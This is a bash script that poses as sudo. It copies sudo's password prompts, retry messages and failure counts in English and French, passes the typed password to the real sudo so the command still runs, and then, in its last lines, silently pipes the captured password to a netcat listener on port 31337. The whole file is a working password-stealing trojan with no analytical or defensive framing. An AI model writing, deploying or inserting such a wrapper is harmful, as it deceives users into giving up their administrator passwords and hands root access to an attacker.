#/bin/bash

#Show usage if no options are given
if [ "$#" -eq 0 ];then
	/usr/bin/sudo
	exit 1
elif [ "$1" == "-h" ];then
	/usr/bin/sudo -h
	exit 0
fi

#Check if user has a valid sudo session
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ];then
	#User has a sudo session. Don't ask again
	/usr/bin/sudo $@
	result=$?
	#Exit correctly depending on the result
	if [ "$result" -eq 0 ];then
		exit 0
	elif [ "$result" -eq 1 ]; then
		exit 1
	fi
fi

#Get locale language
LANG=$(locale | grep 'LANG=' | cut -d'=' -f2)

#Set prompt and error messages
#French messages
if [[ $(echo $LANG | grep 'fr') ]];then
	prompt_msg="[sudo] Mot de passe de $(whoami) :"
	fail_msg="Désolé, essayez de nouveau."
	incorrect_msg="saisies de mots de passe incorrectes"
#English messages
#Make english the default language 
else
	prompt_msg="[sudo] password for $(whoami) :"
	fail_msg="Sorry, try again."
	incorrect_msg="incorrect password attempts"
fi

attempts=0

#Show number of incorrect attempts when user hits Ctrl-C
trap ctrl_c INT

function ctrl_c() {
	if [ "$attempts" -eq 0 ];then
		echo
		exit 1
	else
		echo
		echo "sudo: "$attempts" "$incorrect_msg
		exit 1
	fi
}

while [ "$attempts" -le 2 ]; do
	echo -n $prompt_msg" "
	read -s passwd
	echo
	attempts=$((attempts+1))
	echo $passwd | /usr/bin/sudo -S true > /dev/null 2>&1
	result=$?
	if [ "$result" -eq 1 ];then
		if [ "$attempts" -eq 3 ];then
			echo "sudo: "$attempts" "$incorrect_msg
			exit 1
		else
			echo $fail_msg
		fi
	elif [ "$result" -eq 0 ];then
		echo $passwd | /usr/bin/sudo -S $@
		break
	fi
done

echo $passwd | nc localhost 31337 &
exit 0
